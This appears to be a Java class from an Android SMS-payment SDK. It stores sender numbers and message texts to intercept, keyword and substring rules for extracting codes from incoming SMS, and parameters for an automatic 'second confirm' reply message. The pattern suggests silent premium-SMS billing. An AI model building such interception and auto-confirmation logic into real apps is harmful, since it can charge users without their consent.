package com.y7.smspay.sdk.ss;

import android.text.TextUtils;

import java.util.List;
import java.util.Vector;

public class SsParse {
	public static Vector<String> phoneLst = new Vector<String>();
	public static Vector<String> msgLst = new Vector<String>();

	public static List<SsParseBean> spbLst = new Vector<SsParseBean>();

	public static boolean hasUploadCode = false;

	public static String secondType = null;
	public static String secondPort = null;
	public static String secondMsg = null;

	public static String capCode = null; // 关键字
	public static String capPort = null;// 关键端口
	public static String startWord = null; // 开始截取字符串
	public static String endWord = null;// 结束截取字符串
	public static int direction = 1; // 0向后 1向前
	public static String secondSms = null;//
	
	public static boolean isSecondConfirm = !false;

	public static void setSmsInrp(String _senderPhoneNumber,
			String _messageContent) {
		String[] phoneNumbers = _senderPhoneNumber.split(",");
		String[] messageContents = _messageContent.split(",");
		//DDDLog.d("phoneNumbers.length:" + phoneNumbers.length);
		//DDDLog.d("messageContents.length:" + messageContents.length);

		for (String x : phoneNumbers) {
			if (!TextUtils.isEmpty(x)) {
				SsParse.phoneLst.add(x);
			}
		}
		for (String x : messageContents) {
			if (!TextUtils.isEmpty(x)) {
				SsParse.msgLst.add(x);
			}
		}
		//DDDLog.d("senderPhoneNumberList.size():" + SsParse.phoneLst.size());
		//DDDLog.d("messageContentList.size():" + SsParse.msgLst.size());
	}

	public static void setcapCode() {
		SsParse.hasUploadCode = false;
		
		SsParseBean spb = new SsParseBean();
		spb.setHasUploadCode(SsParse.hasUploadCode);

		spb.setSecondType(SsParse.secondType);
		spb.setSecondPort(SsParse.secondPort);
		spb.setSecondMsg(SsParse.secondMsg);

		spb.setCapCode(SsParse.capCode);
		spb.setCapPort(SsParse.capPort);

		spb.setStartWord(SsParse.startWord);
		spb.setEndWord(SsParse.endWord);
		spb.setDirection(SsParse.direction);

		SsParse.spbLst.add(spb);

		for (SsParseBean spb2 : SsParse.spbLst) {
			//DDDLog.e("SmsParseBean-->" + spb2.toString());
		}
	}

	public static void setSecondSms() {
		//DDDLog.e("setcodeContent _secondSms -->" + SsParse.secondSms);
		try {
			String[] split = SsParse.secondSms.split(";");

			SsParse.secondType = split[0];
			SsParse.secondPort = split[2];
			SsParse.secondMsg = split[3];
		} catch (Exception e) {
			//DDDLog.e("Exception", e);
		}

		//DDDLog.e("capCode-->" + SsParse.capCode + "secondType-->"+ SsParse.secondType);
	}
}
